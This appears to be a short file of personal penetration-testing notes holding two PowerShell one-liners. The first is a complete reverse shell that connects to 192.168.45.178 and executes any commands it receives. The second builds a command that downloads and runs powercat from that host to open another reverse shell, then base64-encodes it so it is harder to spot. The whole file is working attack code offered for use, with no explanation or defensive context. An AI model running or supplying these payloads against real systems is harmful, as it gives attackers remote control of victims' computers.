# Options 1
# Oneliner-Powershell Reverse Shell command. Rmb to use netcat listen
$callback = New-Object System.Net.Sockets.TCPClient("192.168.45.178",6666);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()

# Options 2
# OneLiner-Powershell use Powercat Command.
$Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/powercat.ps1'); powercat -c 192.168.45.178 -p 6688 -e powershell" 
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 
$EncodedText =[Convert]::ToBase64String($Bytes) 
$EncodedText